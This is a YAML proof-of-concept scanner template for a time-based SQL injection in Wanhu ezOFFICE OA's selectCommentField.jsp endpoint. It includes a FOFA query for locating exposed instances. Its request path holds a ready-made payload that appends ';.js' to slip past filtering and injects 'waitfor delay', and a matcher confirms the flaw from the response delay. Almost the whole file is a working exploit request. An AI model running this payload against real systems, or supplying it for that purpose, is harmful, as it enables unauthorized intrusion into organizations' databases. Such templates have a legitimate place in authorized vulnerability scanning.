id: poc-yaml-wanhu-ezoffice-selectcommentfield-sqli
info:
  name: 万户 ezOFFICE selectCommentField SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 万户OA ezoffice
  fofa: app="万户网络-ezOFFICE"
variables:
  t1: random_int(5,10)
  t2: t1 + 3
requests:
- method: GET
  path: /defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1;waitfor+delay+'0:0:{{.t1}}'--+-
  expression: status_code == 200 && contains(body,"setSelectObj") && contains(body,"class=\"selectlist\"")
    && contains(headers,"Path=/defaultroot") && duration > t1 && duration < t2
transport: http
